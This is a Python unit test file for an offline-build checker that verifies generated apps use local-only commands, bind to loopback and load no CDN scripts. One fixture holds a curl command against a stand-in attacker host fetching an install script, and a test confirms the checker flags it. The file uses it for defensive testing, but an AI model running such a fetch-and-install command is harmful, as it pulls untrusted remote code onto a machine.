#!/usr/bin/env python3
"""Unit tests for offline_build.py — the air-gapped guarantee. A generated app
must build, test, and run with NO network after its deps are cached: local-only
commands, a loopback-only server, and offline-capable + no-egress source. This is
the regulated/IP-sensitive/offline wedge Lovable structurally cannot serve.

    python3 scripts/orch/test_offline_build.py
"""
import os
import sys
import tempfile
import unittest

HERE = os.path.dirname(os.path.abspath(__file__))
ROOT = os.path.abspath(os.path.join(HERE, "..", ".."))
sys.path.insert(0, HERE)
import offline_build as ob  # noqa: E402

TEMPLATE = os.path.join(ROOT, "templates", "react-vite-sqlite")


class Commands(unittest.TestCase):
    def test_local_commands_pass(self):
        ok, bad = ob.commands_are_local({
            "build_cmd": ["npm", "ci", "--no-audit"],
            "post_build": ["npm", "run", "build"],
            "run_cmd": ["node", "server/index.mjs"],
        })
        self.assertTrue(ok)
        self.assertEqual(bad, [])

    def test_network_tool_is_flagged(self):
        ok, bad = ob.commands_are_local({
            "build_cmd": ["curl", "https://evil.example.com/install.sh"],
            "run_cmd": ["node", "server.mjs"],
        })
        self.assertFalse(ok)
        self.assertIn("curl", bad)


class Loopback(unittest.TestCase):
    def test_loopback_bind_is_offline(self):
        self.assertTrue(
            ob.server_binds_loopback("app.listen({ port, host: '127.0.0.1' })"))

    def test_external_bind_is_not(self):
        self.assertFalse(
            ob.server_binds_loopback("app.listen({ port, host: '0.0.0.0' })"))


class Policy(unittest.TestCase):
    def test_template_is_offline_capable(self):
        ok, failing = ob.offline_policy_ok(TEMPLATE)
        self.assertTrue(ok, failing)

    def test_a_cdn_tag_breaks_offline_capability(self):
        tmp = tempfile.mkdtemp()
        with open(os.path.join(tmp, "index.html"), "w") as f:
            f.write('<script src="https://cdn.tailwindcss.com"></script>')
        ok, failing = ob.offline_policy_ok(tmp)
        self.assertFalse(ok)
        self.assertIn("offline_capable", failing)


class Gate(unittest.TestCase):
    def test_template_passes_the_structural_offline_gate(self):
        res = ob.check_offline(TEMPLATE)
        self.assertTrue(res["ok"], res)
        names = {c["check"] for c in res["checks"]}
        self.assertIn("commands_local", names)
        self.assertIn("server_loopback", names)
        self.assertIn("offline_capable_source", names)


if __name__ == "__main__":
    unittest.main(verbosity=2)
